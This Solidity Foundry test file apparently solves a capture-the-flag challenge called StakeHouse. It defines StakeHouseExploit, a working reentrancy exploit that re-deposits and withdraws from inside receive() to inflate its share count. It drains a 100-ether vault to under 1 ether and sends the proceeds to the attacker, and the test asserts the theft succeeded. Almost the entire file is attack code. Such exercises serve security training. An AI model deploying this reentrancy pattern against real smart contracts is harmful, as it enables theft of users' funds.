// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";

import {Challenge} from "src/stakehouse/Challenge.sol";
import {StakeHouse} from "src/stakehouse/StakeHouse.sol";

contract SolveTest is Test {
  uint256 internal constant INITIAL_VAULT_BALANCE = 100 ether;
  uint256 internal constant ATTACKER_DEPOSIT = 50 ether;

  Challenge internal challenge;
  StakeHouse internal vault;
  StakeHouseExploit internal exploit;

  address internal deployer;
  address internal attacker;

  function setUp() public {
    deployer = makeAddr("deployer");
    attacker = makeAddr("attacker");

    vm.deal(deployer, INITIAL_VAULT_BALANCE);
    vm.prank(deployer);
    challenge = new Challenge{value: INITIAL_VAULT_BALANCE}();

    vault = challenge.VAULT();
    exploit = new StakeHouseExploit(vault, attacker);

    vm.deal(attacker, ATTACKER_DEPOSIT);
  }

  function testSolve() public {
    vm.prank(attacker);
    exploit.attack{value: ATTACKER_DEPOSIT}();

    assertTrue(challenge.isSolved());
    assertLt(address(vault).balance, 1 ether);
    assertGt(attacker.balance, ATTACKER_DEPOSIT);
  }
}

contract StakeHouseExploit {
  StakeHouse internal immutable vault;
  address payable internal immutable beneficiary;

  uint256 internal victimShares;
  uint256 internal pendingBurns;
  bool internal looping;

  constructor(StakeHouse _vault, address _beneficiary) {
    vault = _vault;
    beneficiary = payable(_beneficiary);
  }

  function attack() external payable {
    victimShares = vault.totalShares();

    vault.deposit{value: msg.value}();

    uint256 initialShares = vault.sharesOf(address(this));
    pendingBurns = initialShares;
    looping = true;

    vault.withdraw(initialShares);

    looping = false;

    uint256 inflatedShares = vault.sharesOf(address(this));
    vault.withdraw(inflatedShares);

    (bool ok,) = beneficiary.call{value: address(this).balance}("");
    require(ok, "transfer failed");
  }

  receive() external payable {
    if (!looping) return;

    vault.deposit{value: msg.value}();

    uint256 freeShares = vault.sharesOf(address(this)) - pendingBurns;
    if (_remainingAfterFinalWithdraw(freeShares) < 1 ether) return;

    pendingBurns += freeShares;
    vault.withdraw(freeShares);
  }

  function _remainingAfterFinalWithdraw(uint256 freeShares) internal view returns (uint256) {
    uint256 totalAssets = address(vault).balance;
    return (totalAssets * victimShares) / (victimShares + freeShares);
  }
}
